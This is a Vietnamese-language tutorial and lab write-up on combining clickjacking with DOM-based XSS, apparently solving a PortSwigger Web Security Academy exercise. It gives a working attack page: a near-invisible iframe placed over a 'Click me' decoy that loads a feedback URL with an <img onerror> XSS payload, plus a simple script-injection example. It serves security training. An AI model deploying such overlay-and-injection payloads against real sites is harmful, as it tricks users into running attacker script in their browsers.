# Combining clickjacking with a DOM XSS attack

**Kết hợp clickjacking với tấn công DOM XSS** là một chiến thuật nguy hiểm khi sử dụng clickjacking như một phương tiện để triển khai một cuộc tấn công DOM XSS (Cross-Site Scripting). Dưới đây là cách hoạt động của kỹ thuật này:

**Cách kết hợp clickjacking và DOM XSS**

1. **Clickjacking độc lập**:

- Trong các tấn công clickjacking thông thường, kẻ tấn công lợi dụng iframe để làm người dùng vô tình thực hiện các hành động như nhấn "like" trên Facebook hoặc kích hoạt một chức năng cụ thể trên trang mục tiêu.

2. **Tấn công DOM XSS**:

- DOM XSS là loại tấn công lợi dụng lỗ hổng trong mã JavaScript phía client của trang web.

- Kẻ tấn công chèn payload XSS vào URL hoặc các tham số đầu vào, sau đó payload này được thực thi trên trình duyệt của nạn nhân.

3. **Kết hợp 2 kỹ thuật**:

- Kẻ tấn công trước tiên xác định lỗ hổng DOM XSS trên trang mục tiêu.

- Sau đó, chúng kết hợp URL chứa payload XSS với clickjacking bằng cách nhúng URL này vào iframe.

- Người dùng bị lừa nhấp vào nút hoặc liên kết trong giao diện giả mạo (decoy), dẫn đến việc kích hoạt tấn công DOM XSS.

**Cách hoạt động cụ thể**

- **Bước 1**: Kẻ tấn công xác định URL mục tiêu có chứa lỗ hổng DOM XSS, ví dụ:

    *https://target-website.com/page?input=<script>alert('XSS')</script>*

- **Bước 2**: Chèn URL này vào iframe trong trang clickjacking:

        <iframe id="target" src="https://target-website.com/page?input=<script>alert('XSS')</script>" style="opacity: 0; position: absolute;"></iframe>
    
- **Bước 3**: Tạo giao diện giả mạo để dụ người dùng click chuột, căn chỉnh nút hoặc liên kết của iframe sao cho hành động click chuột của người dùng kích hoạt payload DOM XSS.

**Ứng dụng thực tế**

- **Tăng độ nguy hiểm của tấn công DOM XSS:**

    - DOM XSS vốn chỉ hoạt động khi nạn nhân tương tác với URL chứa payload.

    - Bằng cách sử dụng clickjacking, kẻ tấn công có thể dễ dàng lừa nạn nhân thực thi payload mà không cần sự nhận thức của họ.

- **Làm tăng khả năng khai thác các hành động phức tạp:**

    - Clickjacking giúp kết hợp DOM XSS với các thao tác khác, như đăng nhập, gửi dữ liệu, hoặc điều khiển giao diện web.

**Tóm lại**:

Sự kết hợp giữa clickjacking và DOM XSS biến một cuộc tấn công XSS vốn đã nguy hiểm thành một phương thức tấn công mạnh mẽ hơn, lừa người dùng thực thi mã độc mà không hay biết. Tấn công này khai thác iframe để làm phương tiện che giấu, kết hợp URL payload XSS để triển khai tấn công vào trình duyệt của nạn nhân.

# Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
![img](19)

### Web page
![img](20)

### Solution

Xem thử chức năng Submit feedback: 

![img](21)

--> CÓ thể lợi dung page /feedback để chèn payload kết hợp clickjacking và DOM XSS.

SỬ dụng payload có dạng sau: 

    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe
    src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

Trong payload này, thẻ iframe, có thuộc tính src chứa URL mục tiêu bao gồm lỗ hổng DOM XSS. Cụ thể, payload DOM XSS được nhúng vào name param. 
        
    name=<img src=1 onerror=print()>

Khi user click, script này được kích hoạt để thực thi mã JS (trong TH này là hàm print()).

Các param khác như email, subject, message không quan trọng, chỉ dùng để lừa user tin rằng họ đang tương tác với 1 trang hợp lệ. 

Chỉnh sửa lại payload thành: 

    <style>
        iframe {
            position:relative;
            width:700px;
            height: 500px;
            opacity: 0.1;
            z-index: 2;
        }
        div {
            position:absolute;
            top:420px;
            left:80px;
            z-index: 1;
        }
    </style>
    <div>Click me</div>
    <iframe
    src="https://0a9600c8047c47f4e388bb8200a200db.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>

Go to exploit server và copy payload vào phần body: 

![img](22)

Store và View exploit: 

![img](23)

Thay đổi lại giá trị opacity thành 0.0001, email và Click Deliver exploit to victim.

Solved the lab!

![img](24)
